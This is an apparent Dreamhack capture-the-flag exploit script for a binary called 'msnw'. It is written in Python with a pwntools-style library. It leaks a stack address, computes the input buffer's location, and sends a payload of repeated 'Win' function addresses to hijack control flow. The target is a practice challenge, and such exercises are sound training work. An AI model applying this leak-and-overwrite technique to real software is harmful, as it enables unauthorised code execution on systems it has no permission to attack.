#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./msnw', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*Meong+80
b*Meong+85
b*Meong+109
c
''') if not args.REMOTE else None

p = remote('host3.dreamhack.games',8269 ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================
Win = exe.sym['Win']

padding = b'A'*0x130

sa(b':',padding)
ru(padding)
leak = u64(p.recv(6)+b'\0\0')
input_field = leak - 0x330
slog("Leak",leak)
slog("Input field", input_field)

payload = p64(Win)*38 + p64(input_field)
slog("Payload len", len(payload))
sa(b':',payload)

interactive()
